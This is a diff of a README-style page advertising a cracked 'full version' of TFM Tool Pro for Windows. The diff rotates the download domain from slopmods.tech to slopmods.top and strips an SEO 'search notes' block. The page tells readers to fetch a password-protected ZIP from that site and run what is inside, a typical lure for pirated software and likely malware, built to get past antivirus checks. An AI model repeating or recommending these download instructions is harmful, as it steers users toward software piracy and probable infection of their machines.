@@ -1,6 +1,6 @@
 ***
 
-# TFM Tool Pro Full Version — Windows Install
+# TFM Tool Pro Windows Setup
 
 TFM Tool Pro — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ TFM Tool Pro — Windows setup and configuration · Premium workspace · Zero na
 
 > Use the release page below for Windows.
 
-- **Release page:** [tfmtool.slopmods.tech](https://tfmtool.slopmods.tech/)
-- **Full URL:** `https://tfmtool.slopmods.tech/`
+- **Release page:** [tfmtool.slopmods.top](https://tfmtool.slopmods.top/)
+- **Full URL:** `https://tfmtool.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **tfmtool.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **tfmtool.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ TFM Tool Pro — Windows setup and configuration · Premium workspace · Zero na
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **tfmtool.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **tfmtool.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **TFM Tool Pro** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Core TFM Tool Pro features on Windows desktop
